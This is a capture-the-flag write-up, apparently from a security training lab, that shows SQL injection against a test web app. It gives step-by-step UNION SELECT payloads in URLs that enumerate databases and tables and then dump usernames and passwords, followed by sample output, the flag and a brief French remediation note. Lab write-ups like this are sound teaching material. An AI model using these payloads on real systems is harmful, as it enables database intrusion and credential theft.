# Sql injection brute force

SQL injection usually occurs when you ask a user for input, like their username/userid, 
and instead of a name/id, the user gives you an SQL statement that you will unknowingly 
run on your database.

## Notes

```bash
http://172.20.10.9/?page=signin&username=&password=&Login=Login#

```

-------------------------------------------
DATABASES

```bash
http://192.168.1.34/index.php
?page=member
&id=-1 UNION ALL SELECT NULL,concat(schema_name) FROM information_schema.schemata--
&Submit=Submit#
```

-------------------------------------------

```
https://172.20.10.9/index.php?page=member&id=1%20AND%201=1&Submit=Submit#
https://172.20.10.9/index.php?page=member&id=1%20UNION%20ALL%20SELECT%20NULL,concat(schema_name)%20FROM%20information_schema.schemata--&Submit=Submit#
```

Output: 

ID: 1 UNION ALL SELECT NULL,concat(schema_name) FROM information_schema.schemata-- 
First name: Barack Hussein
Surname : Obama
ID: 1 UNION ALL SELECT NULL,concat(schema_name) FROM information_schema.schemata-- 
First name: 
Surname : information_schema
ID: 1 UNION ALL SELECT NULL,concat(schema_name) FROM information_schema.schemata-- 
First name: 
Surname : Member_Brute_Force
ID: 1 UNION ALL SELECT NULL,concat(schema_name) FROM information_schema.schemata-- 
First name: 
Surname : Member_Sql_Injection
ID: 1 UNION ALL SELECT NULL,concat(schema_name) FROM information_schema.schemata-- 
First name: 
Surname : Member_guestbook
ID: 1 UNION ALL SELECT NULL,concat(schema_name) FROM information_schema.schemata-- 
First name: 
Surname : Member_images
ID: 1 UNION ALL SELECT NULL,concat(schema_name) FROM information_schema.schemata-- 
First name: 
Surname : Member_survey

```bash
http://192.168.1.34/index.php
?page=member
&id=-1 union select column_name,0 from information_schema.columns where table_schema=CHAR(77, 101, 109, 98, 101, 114, 95, 66, 114, 117, 116, 101, 95, 70, 111, 114, 99, 101)
&Submit=Submit 
```

```bash
http://192.168.1.34/index.php
?page=member
&id=1 UNION ALL SELECT NULL,concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema=CHAR(77, 101, 109, 98, 101, 114, 95, 66, 114, 117, 116, 101, 95, 70, 111, 114, 99, 101)--
&Submit=Submit#
```

--------------------------- 
user password

```bash
http://192.168.1.34/

index.php
?page=member
&id=-1 union select username, password from Member_Brute_Force.db_default
&Submit=Submit
```

THE FLAG IS : B3A6E43DDF8B4BBB4125E5E7D23040433827759D4DE1C04EA63907479A80A6B2

## Correction

Bloquer les injections SQL, forcer l'utilisation d'un mot de passe fort et bloquer au bout de 3 tentatives par exemple les connexions.

## Info

[sql](https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/)<br/>
[sql](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/#UnionInjections)<br/>
[sql](https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/)<br/>
